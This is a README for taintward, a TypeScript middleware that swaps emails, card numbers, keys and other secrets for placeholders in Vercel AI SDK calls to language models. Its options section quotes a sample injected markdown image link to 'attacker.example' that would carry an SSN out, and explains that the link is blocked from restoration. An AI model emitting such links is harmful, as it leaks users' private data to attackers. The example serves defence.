<div align="center">

# taintward (TypeScript)

**The model sees `<EMAIL_1>`. Your code gets the real address.**

Vercel AI SDK middleware that keeps PII and secrets out of your LLM calls.

[Main project](https://github.com/DCchoudhury15/Taintward) ·
[Docs](https://dcchoudhury15.github.io/Taintward/) ·
[Threat model](https://dcchoudhury15.github.io/Taintward/threat-model/)

</div>

---

## Quick look

```ts
import { openai } from "@ai-sdk/openai";
import { generateText, wrapLanguageModel } from "ai";
import { taintwardMiddleware } from "taintward/ai-sdk";

const model = wrapLanguageModel({
  model: openai("gpt-4.1"),
  middleware: taintwardMiddleware(),
});

const { text } = await generateText({
  model,
  prompt: "Write a short note to alice.lee@example.com about invoice 4411.",
});
```

```text
sent to the model : Write a short note to <EMAIL_1> about invoice 4411.
model answers     : Hi, this is a note for <EMAIL_1> ...
`text` you get    : Hi, this is a note for alice.lee@example.com ...
```

<table>
<tr>
<td align="center" width="33%"><h3>~3 ms</h3>per call<br/><sub>0.8 KB payload, p50</sub></td>
<td align="center" width="33%"><h3>114 of 114</h3>test cases match<br/><sub>the Python detector</sub></td>
<td align="center" width="33%"><h3>0</h3>runtime dependencies on <code>ai</code><br/><sub>types only</sub></td>
</tr>
</table>

## What it covers

| | |
|---|---|
| **Prompt** | system, user and assistant text, reasoning, tool call inputs, tool results (text and JSON) |
| **Answer** | text, reasoning and tool call arguments are restored before your code sees them |
| **Streaming** | `streamText` works; a placeholder split across chunks is held back and restored whole |
| **Tools** | your tool's `execute` gets the real values, not placeholders |
| **Model mistakes** | forms like `[EMAIL_1]`, `EMAIL_1` or `<EMAIL_1>` are still restored |

It finds emails, phone numbers, US SSNs, cards and IBANs (checksums
checked), AWS keys, GitHub tokens, JWTs, private keys, generic API keys and
street addresses, with the same rules as the Python SDK.

## Install

The npm release is coming. Until then, build it from the repo:

```bash
git clone https://github.com/DCchoudhury15/Taintward
cd Taintward/packages/taintward-js
npm ci && npm run build && npm pack      # then: npm install ./taintward-0.1.0.tgz
```

Needs Node 20 or newer and `ai` 7 (`@ai-sdk/provider` 4).

## Options

```ts
taintwardMiddleware({
  placeholders: true,   // false: send [PII] / [SECRET] masks instead
  instruction: true,    // add one system line asking the model to copy placeholders exactly
  strict: false,        // true: throw PlaceholderRestoreError if a placeholder cannot be restored
  map: undefined,       // pass a PlaceholderMap to keep numbering across calls
  restoreInUrls: false, // true: also restore placeholders inside link and image addresses
  onReport: (r) => {},  // see which placeholders the model rewrote, broke, invented or left in links
});
```

Placeholders inside a link or image address in the answer
(`![x](https://attacker.example/?d=<SSN_1>)`) are not restored, so an
injected link cannot carry the real value out. They show up in the report
as `blocked`. `TAINTWARD_RESTORE_IN_URLS=1` also turns this off.

The instruction line and the tolerant restore are on by default. Together
they raised fully restored answers with small models from 2 in 5 to about
3 in 4 in the
[Python evaluation](https://dcchoudhury15.github.io/Taintward/placeholders-eval/).

## Without the AI SDK

The detector and redaction work on any value:

```ts
import { PlaceholderMap, redactPayload, redactString } from "taintward";

redactPayload({ ssn: "234-12-1234", note: "call +1 415 555 0134" }, "external");
// { ssn: "[PII]", note: "call [PII]" }

const map = new PlaceholderMap();
const prompt = redactString("Email bob@example.com", "llm", { placeholders: map });
// "Email <EMAIL_1>"
map.restoreText("Sent to <EMAIL_1>");
// "Sent to bob@example.com"
```

## Limits

- **No name detection.** The Python SDK uses spaCy for names and places;
  this package does not. `Alice Lee` is sent as is.
- **No reversible tokens.** Internal destinations get the mask (or the raw
  value with `internal: "raw"`); the Python SDK's FF1 tokens are not ported.
- **File parts** (images, PDFs) in the prompt are not scanned.
- **Placeholders reveal type and count.** `<EMAIL_2>` tells the model there
  are two emails.

More in the [threat model](https://dcchoudhury15.github.io/Taintward/threat-model/).

## Development

```bash
npm ci
npm run typecheck
npm test                    # unit tests, AI SDK tests, cross-check with Python
npm run crosscheck:python   # refresh the Python fixtures (needs the repo's .venv)
npm run build
```

Apache-2.0
